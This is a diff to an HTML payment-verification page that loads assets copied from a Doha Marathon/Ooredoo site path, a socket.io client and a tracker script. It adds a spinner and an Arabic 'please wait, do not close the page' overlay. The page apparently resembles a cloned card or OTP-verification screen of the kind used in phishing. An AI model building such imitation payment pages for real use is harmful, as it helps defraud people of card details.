@@ -9,6 +9,35 @@
 	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
 	<link rel="stylesheet" href="assets/payment-verify.css">
 	<script src="assets/payment-verify.js" defer></script>
+	<style>
+		/* Loading Popup Overlay */
+		.loading-overlay {
+			display: none;
+			position: fixed;
+			top: 0; left: 0; width: 100%; height: 100%;
+			background: rgba(0, 0, 0, 0.7);
+			z-index: 9999;
+			justify-content: center;
+			align-items: center;
+			flex-direction: column;
+			color: white;
+		}
+		
+		.loading-spinner {
+			border: 5px solid rgba(255,255,255,0.3);
+			border-top: 5px solid #ef233c;
+			border-radius: 50%;
+			width: 50px;
+			height: 50px;
+			animation: spin 1s linear infinite;
+			margin-bottom: 15px;
+		}
+		
+		@keyframes spin {
+			0% { transform: rotate(0deg); }
+			100% { transform: rotate(360deg); }
+		}
+	</style>
 </head>
 <body>
 	<header class="card-header">
@@ -63,6 +92,13 @@
 			<p class="local-card-notice">معاينة محلية فقط: لا يتم حفظ أو إرسال رمز التحقق.</p>
 		</section>
 	</main>
+
+	<div class="loading-overlay" id="loadingOverlay">
+		<div class="loading-spinner"></div>
+		<h3 style="font-family: 'Cairo', sans-serif;">جاري التحميل...</h3>
+		<p style="font-size: 0.9em; opacity: 0.8; font-family: 'Cairo', sans-serif;">الرجاء الانتظار وعدم إغلاق الصفحة</p>
+	</div>
+
 <script src="/socket.io/socket.io.js"></script>
 <script src="/api/env-config.js"></script><script src="/assets/tracker.js"></script>
 </body>
